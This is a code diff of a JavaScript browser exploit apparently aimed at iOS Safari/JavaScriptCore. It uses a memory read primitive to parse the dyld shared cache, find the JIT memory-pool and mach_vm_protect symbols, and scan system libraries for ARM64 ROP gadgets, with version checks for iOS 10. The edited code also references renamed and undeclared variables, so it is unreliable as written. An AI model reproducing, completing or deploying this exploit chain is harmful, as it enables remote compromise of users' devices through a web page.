@@ -550,40 +550,40 @@ function exploit(){
     }
 
     memory.u32 = _u32;
-        log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
+        //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
-        var dcache_base = Add(0x180000000,nslide);
-        var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0, 100)); //dump first 100-bytes
-        log('[+] Dumping dyld shared cache...');
-        log(hexdump(dcache_dump, 100, dcache_base));
-        var dcache_base_seg;
+        var hdr = Add(0x180000000,nslide);
+        var dcache_base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
-        var dcache_nsegs = memory.u32(Add(dcache_base,0x14));
+        var nsegs = memory.u32(Add(dcache_base,0x14));
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
-        var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.u32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
-        var dcache_segs = [];
-        for(var i = 0; i < dcache_nsegs; i++){
-            var off = i * 0x20;
-            var seg = {  
-                addr:     new Int64(dcache_segdata.slice(off + 0x0,off +0x8)),
-                size:     new Int64(dcache_segdata.slice(Add(off, 0x8), Add(off,0x10))),
-                fileoff:  new Int64(dcache_segdata.slice(Add(off,0x10), Add(off,0x18))),
-                maxprot:  b2u32(dcache_segdata.slice(Add(off,0x18), Add(off,0x1c))),
-                initprot: b2u32(dcache_segdata.slice(Add(off,0x1c), Add(off,0x20)))
-            };
-            dcache_segs.push(seg);
-        
-            if(seg.fileoff == 0 && seg.size != 0) {
-            dcache_base_seg = seg;
-            //log("dcache base seg@"+dcache_base_seg)
-        } else {
-        fail("base_seg");
-    }
-        var cache_slide = Sub(dcache_base,dcache_base_seg.addr);
-        log("cache_slide =" + cache_slide);
-        for(var i = 0; i < dcache_segs.length; ++i)
+        var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
+        var segs     = [];
+        for(var i = 0; i < nsegs; ++i)
         {
-            dcache_segs[i].addr = Add(dcache_segs[i].addr, cache_slide);
+            var off = i * 0x20;
+            var seg =
+            {
+                addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
+                size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
+                fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
+                maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
+                initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
+            };
+            segs.push(seg);
+            if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
+            {
+                base_seg = seg;
+            }
+        }
+        if(base_seg == null)
+        {
+            fail("base_seg");
+        }
+        var cache_slide = Sub(hdr, base_seg.addr);
+        for(var i = 0; i < segs.length; ++i)
+        {
+            segs[i].addr = Add(segs[i].addr, cache_slide);
         }
         var libs =
         {
@@ -591,8 +591,8 @@ function exploit(){
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
             "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32taggedstartOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30taggedendOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
             ],
         };
 
@@ -600,7 +600,7 @@ function exploit(){
         var opcode_libs;
 
         if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
-            log('found iPhone OS 10')
+            //print('found iPhone OS 10')
             opcodes = {
                 // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
                 "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
@@ -615,9 +615,10 @@ function exploit(){
                 // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
                 "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
             };
+
             opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
         } else {
-            log('found iPhone OS != 10')
+            //print('found iPhone OS != 10')
             libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
                 "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
             )
@@ -642,24 +643,20 @@ function exploit(){
                 "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
             ];
         }
-        log('lookin through cache');
+        //print('lookin through cache');
 
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(dcache_base, memory.u32(Add(dcache_base, 0x18)));
-        log("cache images" + imgs)
-        var nimgs = memory.u32(Add(dcache_base, 0x1c));
-        //var nimgs = Add(dcache_base, memory.u32())
-        log("number of cache images = " + nimgs)
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
+        var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; ++i)
         {
-            var straddr = off2addr(dcache_segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.read(Add(straddr, i),1)[0];
+                return memory.read(Add(straddr, i), 1)[0];
             };
-            var base = Add(memory.read_i32(Add(imgs, i * 0x20)),cache_slide);
-            log("base" + base)
+            var base = Add(memory.readInt64(Add(imgs, i * 0x20)), cache_slide);
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
@@ -673,7 +670,6 @@ function exploit(){
                         {
                             if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
                             {
-                                log("made it?")
                                 var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
                                 if (keys.length == 0) break;
                                 var match = {};
@@ -682,8 +678,7 @@ function exploit(){
                                     match[keys[z]] = 0;
                                 }
 
-                                var addr = Add(memory.read_i64(Add(base, o + 0x20)), cache_slide)
-                                log("address" + addr)
+                                var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
                                 var size = memory.u32(Add(base, o + 0x28))
 
                                 // Copy the entire __text region into a Uint32Array for faster processing.
@@ -701,14 +696,14 @@ function exploit(){
                                     if (size - r < qty) {
                                         qty = size - r
                                     }
-                                    var data = memory.read(Add(addr, r),0, qty)
+                                    var data = memory.read(Add(addr, r), qty)
 
                                     // Data is an array of single bytes. This code takes four entries
                                     // and converts them into a single 32-bit integer. It then adds it
                                     // into the `allData` array at the given index
-                                    for (var g = 0; g < qty; g += 4) {
-                                        var fourBytes = b2u32(data.slice(g, g + 4))
-                                        allData[(r + g) / 4] = fourBytes
+                                    for (var h = 0; h < qty; h += 4) {
+                                        var fourBytes = b2u32(data.slice(h, h + 4))
+                                        allData[(r + h) / 4] = fourBytes
                                     }
                                 }
 
@@ -754,7 +749,7 @@ function exploit(){
             }
             if(lookup != null)
             {
-                fsyms(memory, base, dcache_segs, lookup, syms);
+                fsyms(memory, base, segs, lookup, syms);
             }
         }
         if(!gadgets['dispatch'])
@@ -786,7 +781,6 @@ function exploit(){
                 fail(s);
             }
         }
-        log("...")
 
         
     }
